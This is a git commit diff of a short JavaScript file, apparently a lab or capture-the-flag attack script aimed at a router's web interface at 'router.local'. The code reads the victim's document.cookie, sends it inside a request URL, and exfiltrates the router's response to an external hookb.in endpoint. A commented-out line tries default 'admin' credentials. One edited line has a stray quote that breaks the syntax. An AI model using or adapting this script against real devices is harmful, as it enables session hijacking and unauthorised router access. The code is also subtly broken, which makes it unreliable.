d7d6ca669eab4e00e5f78ea06c33697d8cddea4c
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-06 18:29:32 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,17 +1,18 @@
 const http = new XMLHttpRequest();
 //http.open('POST', 'http://router.local/login.php', true);
-http.open('POST', 'http://router.local/view.php', true);
+const cook = document.cookie;
+http.open('POST', 'http://router.local/home.php?action=https://nastassiagoodson.github.io/attack&'+cook', true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/oX0YEDnGpKtBnPZZXkbe', true);
+                xhr.open('POST', 'https://hookb.in/7ZMjVb3gZRCWNgjjlmxp', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
 
 };
-const cook = document.cookie;
+
 http.send();
 //http.send(cook+"&username=admin&pin=admin&notRobot=on");
 
